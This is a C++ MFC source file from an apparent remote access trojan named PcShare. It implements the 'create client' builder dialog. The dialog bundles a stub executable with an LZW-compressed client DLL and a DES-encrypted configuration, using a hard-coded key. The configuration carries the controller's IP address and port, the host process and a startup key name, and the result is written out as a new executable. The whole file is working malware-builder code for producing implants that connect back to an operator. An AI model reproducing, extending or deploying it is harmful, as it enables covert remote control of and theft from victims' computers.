// MyCreateClientDlg.cpp : implementation file
//

#include "stdafx.h"
#include "PcShare.h"
#include "Lzw.h"
#include ".\mycreateclientdlg.h"
#include "WjcDes.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern GOLBALVALUE m_MainValue ;

/////////////////////////////////////////////////////////////////////////////
// CMyCreateClientDlg dialog

CMyCreateClientDlg::CMyCreateClientDlg()
: CDialog(CMyCreateClientDlg::IDD, NULL)
{
	//{{AFX_DATA_INIT(CMyCreateClientDlg)
	m_Port = _T("");
	m_BakUrl = _T("");
	m_CtrlFile = _T("");
	//m_Proc = 0;
	m_Proc = 2;
	//}}AFX_DATA_INIT
	m_IsVip = FALSE;
}

void CMyCreateClientDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMyCreateClientDlg)
	DDX_Control(pDX, IDC_COMBO_IPLIST, m_IpList);
	DDX_Text(pDX, IDC_EDIT_PORT, m_Port);
	DDV_MaxChars(pDX, m_Port, 5);
	DDX_Text(pDX, IDC_EDIT_BAK_URL, m_BakUrl);
	DDV_MaxChars(pDX, m_BakUrl, 128);
	DDX_Text(pDX, IDC_EDIT_CONTROL_DLL, m_CtrlFile);
	DDV_MaxChars(pDX, m_CtrlFile, 250);
	DDX_Radio(pDX, IDC_RADIO_VIP, m_IsVip);
	DDX_CBIndex(pDX, IDC_COMBO_PROC, m_Proc);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMyCreateClientDlg, CDialog)
	//{{AFX_MSG_MAP(CMyCreateClientDlg)
	ON_BN_CLICKED(IDC_BUTTON_CREATE, OnButtonCreate)
	ON_BN_CLICKED(IDC_RADIO_VIP, OnBnClickedRadioVip)
	ON_BN_CLICKED(IDC_RADIO_NOVIP, OnBnClickedRadioNovip)
	//}}AFX_MSG_MAP
	
	
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyCreateClientDlg message handlers

BOOL CMyCreateClientDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();

	char m_IniFileName[256] = {0};
	GetIniFileName(m_IniFileName);

	char m_sMainPort[20] = {0};
	GetPrivateProfileString("设置","自动上线连接端口",
		"80",m_sMainPort,10,m_IniFileName);
	m_Port = m_sMainPort;

	char m_sCtrlName[256] = {0};
	GetPrivateProfileString("设置","控制DLL文件",
		"PcCortr.dll",m_sCtrlName,255,m_IniFileName);
	m_CtrlFile = m_sCtrlName;

	char m_sBakUrlName[256] = {0};
	GetPrivateProfileString("设置","备份URL名称",
		"",m_sBakUrlName,255,m_IniFileName);
	m_BakUrl = m_sBakUrlName;


	GetDlgItem(IDC_COMBO_IPLIST)->EnableWindow(TRUE);
	GetDlgItem(IDC_EDIT_PORT)->EnableWindow(TRUE);
	GetDlgItem(IDC_EDIT_BAK_URL)->EnableWindow(FALSE);
	
	UpdateData(FALSE);

	//取IP地址信息
	PHOSTENT hostinfo;
	char name[512] = {0};
	if(gethostname (name,sizeof(name)) != 0 ||
		(hostinfo = gethostbyname(name)) == NULL)
		return TRUE;
	
	struct sockaddr_in dest;
	for(int i=0; hostinfo->h_addr_list[i] != NULL ;i++)
	{
		memcpy(&(dest.sin_addr), 
			hostinfo->h_addr_list[i],
			hostinfo->h_length);
		m_IpList.AddString(inet_ntoa(dest.sin_addr));
	}
	m_IpList.SetCurSel(0);
	return TRUE;  
}

void CMyCreateClientDlg::OnButtonCreate() 
{
	char m_IniFileName[256] = {0};
	GetIniFileName(m_IniFileName);
	WritePrivateProfileString("设置","控制DLL文件",
		m_CtrlFile,m_IniFileName);
	if(!m_BakUrl.IsEmpty())
		WritePrivateProfileString("设置","备份URL名称",
			m_BakUrl,m_IniFileName);

	//取目标文件名称
	CString szFilter = "可执行文件(*.exe)|*.exe|";
	CFileDialog m_filedialog(FALSE,NULL,"Ps.exe",
		OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,szFilter,this);
	if(m_filedialog.DoModal() != IDOK) return;
	m_StartFile = m_filedialog.GetFileName();
	CString strFilePath = m_filedialog.GetPathName();

	//取EXE文件和DLL文件名称
	char m_ExeFileName[512] = "PcStat.exe";
	GetMyFilePath(m_ExeFileName);
	char m_DllFileName[512] = "PcClient.dll";
	GetMyFilePath(m_DllFileName);
	BYTE* pExeFileData = NULL;
	BYTE* pDllFileData = NULL;
	DWORD m_ExeSize = 0;
	DWORD m_DllSize = 0;

	//取EXE文件数据
	CFile m_File;
	if(!m_File.Open(m_ExeFileName,CFile::modeRead))
	{
		MessageBox("缺少文件pcstat.exe","错误");
		return;
	}
	m_ExeSize = m_File.GetLength();
	pExeFileData = new BYTE[m_ExeSize];
	m_File.Read(pExeFileData,m_ExeSize);
	m_File.Close();

	//取DLL文件数据
	if(!m_File.Open(m_DllFileName,CFile::modeRead))
	{
		delete [] pExeFileData;
		MessageBox("缺少文件pcclient.dll","错误");
		return;
	}
	m_DllSize = m_File.GetLength();
	pDllFileData = new BYTE[m_DllSize];
	m_File.Read(pDllFileData,m_DllSize);
	m_File.Close();

	//压缩数据
	BYTE* pDest = new BYTE[m_DllSize * 2];
	memset(pDest , 0 , m_DllSize * 2);

	BYTE* pSrc = pDllFileData;
	BYTE* pCurr = pDest;

    //生成的文件的结构：
    //pcstat.exe文件内容 pcclient.dll内容 SSH 压缩前dll大小 生成的用户名 压缩后的的PcClient.dll内容 加密后的启动内容

	//写头
	::lstrcpyA ((char*)pDest, "SSH") ;
	pCurr += 8 ;
	* (WORD *) pCurr = 16 ;
	pCurr += 2 ;
	* (WORD *) pCurr = 0 ;
	pCurr += 2 ;
	* (DWORD *) pCurr = m_DllSize ;
	pCurr += 4 ;
	pCurr += 8 ;

	// 文件名
	* (WORD *) pCurr = ::lstrlen (m_StartFile) ;
	::lstrcpy ((char *) pCurr+2, m_StartFile) ;
	pCurr += * (WORD *) pCurr + 2 ;

	//压缩
	DWORD dwCounter = ::GetTickCount () ;
	FCLzw fLzw ;
	pCurr += fLzw.LZW_Encode (pSrc, m_DllSize, pCurr) ;
	dwCounter = ::GetTickCount () - dwCounter ;
	* (DWORD *) &pDest[16] = dwCounter ;

	//启动信息
	INITDLLINFO m_InitInfo = {0};

	m_IpList.GetWindowText(m_InitInfo.m_ServerAddr,50);
	strcpy(m_InitInfo.m_CtrlFile,m_CtrlFile);
	m_InitInfo.m_ProcessName[0] = m_Proc;

	strcpy(m_InitInfo.m_StartFile,m_StartFile);
	m_InitInfo.m_StartFile[m_StartFile.GetLength() - 4] = 0;
	strcpy(m_InitInfo.m_KeyName,m_InitInfo.m_StartFile);
	m_InitInfo.m_KeyName[m_StartFile.GetLength() - 1] = 0;
	strcat(m_InitInfo.m_StartFile, ".dll");
	m_InitInfo.m_ServerPort = (WORD) (atoi((LPCTSTR) m_Port));
	m_InitInfo.m_DllFileLen = pCurr - pDest;

	//DES加密信息
	INITDLLINFO m_InitFileInfo = {0};
	char m_DesKey[9] = "\x10\x20\x17\x10\x09\x55\x11\xeb";
	Des_Go((char*) &m_InitFileInfo, (char*) &m_InitInfo, 
		sizeof(INITDLLINFO), m_DesKey, 8, ENCRYPT_);//加密 

	//创建目标文件
	//m_StartFile.Insert(0, _T("e:\\"));
	if(!m_File.Open(strFilePath, CFile::modeCreate|CFile::modeWrite))
	{
		delete [] pExeFileData;
		delete [] pDllFileData;
		delete [] pDest;
		MessageBox("无法创建文件",m_StartFile.GetString());
		return;
	}
	m_File.Write(pExeFileData,m_ExeSize);
	m_File.Write(pDest,m_InitInfo.m_DllFileLen);
	m_File.Write(&m_InitFileInfo,sizeof(INITDLLINFO));
	m_File.Close();

	delete [] pExeFileData;
	delete [] pDllFileData;
	delete [] pDest;

	MessageBox("生成客户端成功", "提示");
}

void CMyCreateClientDlg::OnBnClickedRadioVip()
{
	GetDlgItem(IDC_COMBO_IPLIST)->EnableWindow(TRUE);
	GetDlgItem(IDC_EDIT_PORT)->EnableWindow(TRUE);
	GetDlgItem(IDC_EDIT_BAK_URL)->EnableWindow(FALSE);
}

void CMyCreateClientDlg::OnBnClickedRadioNovip()
{
	GetDlgItem(IDC_COMBO_IPLIST)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT_PORT)->EnableWindow(FALSE);
	GetDlgItem(IDC_EDIT_BAK_URL)->EnableWindow(TRUE);
}

